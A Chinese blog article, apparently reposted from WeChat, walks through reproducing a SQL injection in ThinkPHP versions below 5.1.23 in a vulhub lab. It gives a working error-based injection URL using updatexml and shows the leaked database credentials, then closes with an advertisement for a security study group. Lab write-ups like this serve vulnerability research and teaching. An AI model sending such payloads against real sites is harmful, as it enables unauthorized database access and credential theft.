> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1ZkiKqHogWOy0U4rQNnGtQ)

****文章来源｜MS08067 WEB 攻防知识星球****

> 本文作者：**叫我啊**（Ms08067 实验室追洞小组成员）

**漏洞复现分析  认准追洞小组  
**

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cniaUZzJeYAibE3v2VnNlhyC6fSTgtW94Pz51p0TSUl3AtZw0L1bDaAKw/640?wx_fmt=png)

**一、漏洞介绍**  

ThinkPHP 是一个开源的，快速、简单的面向对象的轻量级 PHP 开发框架

**二、影响版本**

```
ThinkPHP < 5.1.23
```

**三、漏洞复现**

采用 vulhub 快速搭建

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9umzdgZcprakicmwHb7pfRV9ibH8hfP1PId6PHSm6wRqg1MPgffGjDF251qBfl2mCUaOrk7JPoOUow/640?wx_fmt=png)

启动后，访问 http://your-ip/index.php?ids[]=1&ids[]=2 ，即可看到用户名被显示了出来，说明环境运行成功。

http://192.168.47.130/index.php?ids[]=1&ids[0,updatexml(0,concat(0x7e,user()),0)]=2

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9umzdgZcprakicmwHb7pfRVwSpm7NQ5S8k49L7aArpf9iaibXuiatSTVm4XTFBAvJ0dV1WicqibgDqb6aQ/640?wx_fmt=png)

可以之间看到存在敏感信息泄露

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9umzdgZcprakicmwHb7pfRVmBqo16mZA0DEEFfPvv0bYosAkTurQ7BG5AsiapIxL9pbW5jWPTm3I9g/640?wx_fmt=png)

可以发现数据库的账号、密码：为 root 、root

**四、漏洞分析**

该漏洞需要开发者使用了 GIS 中聚合查询的功能，用户在 oracle 的数据库且可控 tolerance 查询时的键名，在其位置注入 SQL 语句。

https://blog.csdn.net/qq_41832837/article/details/104066647

**【追洞计划】****顾名思义即追最新的漏洞，包括** **2020&2021 所有 Apache 漏洞 + 主流框架****，将会在星球内部招收感兴趣学员，纳入追洞小组。**

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicBSVWEh3E9RUYC1s7ibxjdxL3M2oibOs9FWy7sG0niaz9UunJe6XU5dh0vVa3CObU9YsiaFDNk7IViaWQ/640?wx_fmt=png)

**主讲导师介绍：**

**Taoing**：Ms08067 安全实验室核心成员，现任安恒信息高级安全工程师，擅长 web 渗透测试，应急响应。

**TtssGkf：**Ms08067 实验室核心成员，Defcon86021 议题分享者，擅长领域：渗透测试，漏洞分析，代码审计，安全开发。

**扫描下方二维码加入星球学习**

**加入后会邀请你进入内部微信群，内部微信群永久有效！**

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cniaUZzJeYAibE3v2VnNlhyC6fSTgtW94Pz51p0TSUl3AtZw0L1bDaAKw/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cT2rJYbRzsO9Q3J9rSltBVzts0O7USfFR8iaFOBwKdibX3hZiadoLRJIibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicBVC2S4ujJibsVHZ8Us607qBMpNj25fCmz9hP5T1yA6cjibXXCOibibSwQmeIebKa74v6MXUgNNuia7Uw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicjovru6mibAFRpVqK7ApHAwiaEGVqXtvB1YQahibp6eTIiaiap2SZPer1QXsKbNUNbnRbiaR4djJibmXAfQ/640?wx_fmt=jpeg) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicJ39cBtzvcja8GibNMw6y6Amq7es7u8A8UcVds7Mpib8Tzu753K7IZ1WdZ66fDianO2evbG0lEAlJkg/640?wx_fmt=png)  

**目前 36000 + 人已关注加入我们  
**![](https://mmbiz.qpic.cn/mmbiz_gif/XWPpvP3nWa9FwrfJTzPRIyROZ2xwWyk6xuUY59uvYPCLokCc6iarKrkOWlEibeRI9DpFmlyNqA2OEuQhyaeYXzrw/640?wx_fmt=gif)